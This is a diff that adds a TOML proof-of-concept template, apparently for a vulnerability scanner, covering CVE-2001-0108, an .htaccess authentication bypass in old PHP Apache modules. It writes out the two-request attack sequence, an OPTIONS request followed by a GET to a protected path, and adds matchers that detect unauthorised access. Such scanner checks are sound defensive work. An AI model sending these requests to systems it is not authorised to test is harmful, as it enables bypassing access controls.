@@ -1,0 +1,51 @@
+[info]
+author = "AVE"
+description = "PHP Apache 模块 4.0.4 及更早版本存在 .htaccess 安全绕过漏洞。攻击者先向未受限制页面发送 OPTIONS 请求（或畸形 HTTP 请求），导致 PHP 将当前目录的配置指令泄露到同一 Apache 子进程的下一个请求。随后访问受 .htaccess 保护的页面时，可能绕过身份验证和访问限制。该 PoC 通过发送 OPTIONS 请求后检测受保护页面是否可被未授权访问来验证漏洞存在。"
+id = "POC-AVE-2001-0226"
+name = "CVE-2001-0108 PoC"
+severity = "medium"
+tags = ["cve-2001-0108"]
+vuln_id = [
+    "CVE-2001-0108",
+    "AVE-2001-0226",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "OPTIONS"
+path = "/{{BaseURL}}/index.php"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "{{Hostname}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "200",
+    "OPTIONS",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/protected/"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "{{Hostname}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "401",
+    "Authorization Required",
+    "Unauthorized",
+]
